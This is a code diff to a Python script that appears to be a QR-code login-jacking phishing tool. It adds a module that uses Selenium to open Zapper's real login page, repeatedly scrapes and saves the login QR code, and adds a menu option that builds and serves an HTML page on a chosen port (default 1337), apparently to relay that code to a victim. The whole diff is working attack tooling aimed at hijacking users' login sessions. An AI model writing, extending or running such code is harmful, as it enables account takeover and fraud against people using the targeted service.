@@ -300,6 +300,28 @@ def mydigipass():
 		except:
 			break
 
+def Zapper():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("https://www.zapper.com/login.php")
+	time.sleep(5)
+	title = driver.title.encode("utf-8")
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			c = web.find_elements_by_id("qrcodecontainer2")
+			img = c[0].find_elements_by_tag_name("img")[0]
+			print " [+]The QR code image found !"
+			src = img.get_attribute('src')
+			print " [+]Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [#]Saved To tmp.png"
+			time.sleep(10)
+			continue
+		except:
+			break
+
 def make(typ="html"):
 	if typ == "html":
 		code = """<html>
@@ -615,7 +637,7 @@ def main():
 	if choice == 7:
 		print """
  1.MyDigiPass
- 2.Zapper [Soon]
+ 2.Zapper
  3.Trustly App [Soon]
  4.Yelophone [Soon]
  5.Alibaba Yunos [Soon]
@@ -638,6 +660,21 @@ def main():
 			make()
 			Serve_it(port)
 			mydigipass()
+			main()
+
+		elif int(choice_2) == 2:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			Zapper()
 			main()
 
 	#Customization
